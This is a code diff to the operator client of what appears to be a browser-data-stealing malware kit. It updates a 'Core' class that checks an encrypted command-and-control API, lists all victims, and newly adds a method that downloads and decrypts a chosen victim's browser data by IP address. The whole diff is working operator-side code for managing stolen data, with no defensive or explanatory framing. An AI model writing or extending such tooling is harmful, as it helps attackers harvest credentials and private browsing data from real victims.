@@ -1,14 +1,13 @@
 """CLI core class"""
-from models.encryption import CLIEncryption
+from models.CryptoCore import CryptoCore
 import requests
 import json
 
 
-
-class Core(CLIEncryption):
+class Core(CryptoCore):
     """Core class for CLI"""
     IsReady = False
-    EndPoint = None
+    ApiUrl = None
 
     def GetUserInput(self, PromptText: str, ErrorText: str, InputLength: int, ExpectedInput: list, AllLower: bool) -> str:
         """
@@ -59,13 +58,14 @@ class Core(CLIEncryption):
             self.CryptographicParam(params["key"], params["IV"])
 
     def check(self) -> bool:
-        """Check if the endpoint is reachable and validate the cryptographic parameters."""
-        if self.EndPoint is None:
-            print("[-] The Endpoint URL is missing, You should set it before checking the endpoint.")
+        """Check if the api is reachable and validate the cryptographic parameters."""
+        if self.ApiUrl is None:
+            print("[-] The api URL is missing, You should set it before checking the api.")
+            return
         if self.CheckParam() is True:
             TestMessage = self.EncryptBuffer("Are you ready?")
             header = {"cc": TestMessage}
-            url = self.EndPoint + "/check"
+            url = self.ApiUrl + "/check"
             try:
                 response = requests.get(url=url, headers=header, timeout=5)
 
@@ -73,21 +73,43 @@ class Core(CLIEncryption):
                     self.IsReady = True
                     print("[+] The check is done, everything is correct.")
                 else:
-                    print("[-] Incorrect cryptographic parameters. You should verify that the used parameters are the same ones on the endpoint.")
+                    print("[-] Incorrect cryptographic parameters. You should verify that the used parameters are the same ones on the api.")
             except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
-                print("[-] The endpoint is not reqponding, You should verify that the endpoint URL is correct.")
+                print("[-] The api is not reqponding, You should verify that the api URL is correct.")
         else:
-            print("[-] The cryptographic parameters are missing, You should set them or load a setting file before checking the endpoint.")
+            print("[-] The cryptographic parameters are missing, You should set them or load a setting file before checking the api.")
 
     def GetVictims(self) -> dict:
         if self.IsReady is True:
-            url = self.EndPoint + "/GetAll"
+            url = self.ApiUrl + "/GetAll"
 
             try:
                 response = requests.get(url=url)
                 data = self.DecryptBuffer(response.text)
                 return json.loads(data)
             except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
-                print("[-] The endpoint is down.")
-        
+                print("[-] The api is down.")
+
+        return None
+
+    def GetVictimBrowsersData(self, VictimIP):
+        if self.IsReady is True:
+            url = self.ApiUrl + "/GetVictimData"
+            ip = self.EncryptBuffer(VictimIP)
+            header = {"TARGET": ip}
+
+            try:
+                response = requests.get(url=url, headers=header, stream=True)
+                data = ""
+                if response.status_code == 200:
+                    for chunk in response.iter_content(chunk_size=102400):
+                        if chunk:
+                            data += chunk.decode("utf-8")
+                    data = self.DecryptBuffer(data)
+                    return json.loads(data)
+                elif response.status_code == 204:
+                    print("[-] The victim does not exists.")
+            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
+                print("[-] The api is down.")
+
         return None
